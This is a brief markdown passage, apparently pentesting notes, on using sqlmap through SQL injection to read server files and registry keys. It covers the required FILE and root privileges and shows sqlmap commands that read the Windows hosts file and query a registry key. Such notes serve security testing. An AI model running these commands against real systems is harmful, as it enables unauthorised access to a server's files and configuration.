## Conditions

1. The DB user must have **FILE** and **SELECT** privileges perform with the flags `--privileges -U CU`.
2. Not all files are readable unless the current user is `root@<IP>` (e.g. `root@localhost`). You'll notice that you can't fetch SSH credentials which is normal due to security reasons.

## Automated

- DNS resolve and nameserver IPs

```
$ sqlmap -u "<URL>" --random-agent --file-read="C:/Windows/System32/drivers/etc/hosts"
```

TODO: Use registry to enumerate the windows version

```
$ sqlmap -u "<URL>" --reg-key="HKLM\SOFTWARE\Microsoft" --reg-value=Version
